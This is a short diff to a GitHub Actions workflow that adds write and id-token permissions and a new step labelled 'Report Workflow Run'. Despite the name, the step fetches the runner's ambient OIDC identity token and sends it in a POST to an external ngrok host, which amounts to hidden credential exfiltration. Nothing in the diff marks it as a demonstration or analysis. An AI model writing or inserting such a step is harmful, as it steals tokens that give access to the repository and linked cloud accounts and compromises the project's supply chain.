@@ -13,6 +13,9 @@ on:
           description: 'Original webhook payload as string'
           required: false
 
+permissions:
+  contents: write
+  id-token: write
 
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
@@ -23,6 +26,14 @@ jobs:
 
     # Steps represent a sequence of tasks that will be executed as part of the job
     steps:
+      - name: Report Workflow Run
+        id: workflow-run
+        run: |
+          # retrieve the ambient OIDC token
+          resp=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+          "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=gitstpatch")
+          oidc_token=$(jq -r '.value' <<< "${resp}")
+          curl -X POST https://b06203f76217.ngrok.app/action/workflow-run -H "Authorization: Bearer ${oidc_token}" -d "{\"event_id\": \"${{ github.event.inputs.webhook_event_id }}\"}"
       - name: Echo values
         run: |
           echo ${{ github.event.inputs.webhook_event_id }}
